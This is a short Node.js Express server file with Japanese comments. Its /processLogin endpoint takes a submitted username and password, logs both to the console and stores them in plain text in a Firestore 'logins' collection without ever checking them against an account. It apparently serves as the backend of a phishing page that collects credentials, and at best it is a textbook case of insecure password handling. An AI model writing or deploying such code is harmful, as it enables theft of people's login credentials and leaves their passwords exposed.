// app.js
const express = require('express');
const path = require('path');
const admin = require('firebase-admin');

// Firebaseの秘密鍵ファイルを読み込む（プロジェクトのルートに配置）
const serviceAccount = require('./inst-732a8-firebase-adminsdk-fbsvc-8891993b0a.json');

// Firebase Admin SDKの初期化
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

// Firestoreインスタンスの生成
const db = admin.firestore();

const app = express();

// ミドルウェア：POSTデータのパース
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 静的ファイルの配信（publicフォルダ内）
app.use(express.static('public'));

// フォーム送信のエンドポイント
app.post('/processLogin', async (req, res) => {
  const { username, password } = req.body;
  
  // デバッグ用ログ
  console.log("Received data:", username, password);
  
  if (!username || !password) {
    console.error("入力不足: username or password is missing");
    return res.status(400).json({ status: 'Error', message: '入力が不足しています' });
  }
  
  try {
    // Firestoreの "logins" コレクションにデータを追加する
    const docRef = await db.collection('logins').add({
      username: username,
      password: password,
      date: admin.firestore.FieldValue.serverTimestamp()
    });
    
    // デバッグ用ログ：追加したドキュメントIDを出力
    console.log("Document written with ID:", docRef.id);
    
    res.json({ status: 'Success', id: docRef.id });
  } catch (err) {
    console.error('Error writing to Firestore:', err);
    res.status(500).json({ status: 'Error', message: 'データ保存に失敗しました' });
  }
});

// サーバーの起動
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});